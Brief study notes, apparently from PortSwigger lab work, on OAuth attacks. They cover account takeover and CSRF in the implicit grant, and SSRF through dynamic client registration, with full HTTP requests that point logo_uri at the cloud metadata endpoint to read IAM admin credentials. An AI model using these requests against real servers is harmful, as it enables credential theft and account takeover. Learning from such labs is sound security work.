# Oauth
### Implicit Grant Type
 - Reference: https://portswigger.net/web-security/oauth
 - When logging in, some client application use POST form with login, Server may just accept the request, change `email`? to gain access to another users permission.
 - If there is no `state` parameter during linking, might be able to perform CSRF.

### SSRF via dynamic client registration
 - This had an interesting lab
 - Get the oauth enddpoint and make a request `/.well-known/oauth-authorization-server` `/.well-known/openid-configuration`
 - Get registration endpoint.
 - Register client, "logo_uri" tne internal endpoint.
```
POST /reg HTTP/2
Host: oauth-0a76003e04adbe58804738f202a10051.oauth-server.net
Content-Type: application/json
Content-Length: 194

{
	"redirect_uris":[
	"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
	],
"logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"

}
```
 - Get /client/client_id/logo, sends request to `logo_uri` which will be internal and we get the response.
```
GET /client/kUHvtXsqAdefRAThRCPct/logo HTTP/2
Host: oauth-0a76003e04adbe58804738f202a10051.oauth-server.net
Cookie: _session=ptfZpFjDvblDlXq6kIl7p; _session.legacy=ptfZpFjDvblDlXq6kIl7p
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Sec-Ch-Ua-Platform: ""
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://oauth-0a76003e04adbe58804738f202a10051.oauth-server.net/interaction/UYP38U4d5VT-MmtK7voay
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

```
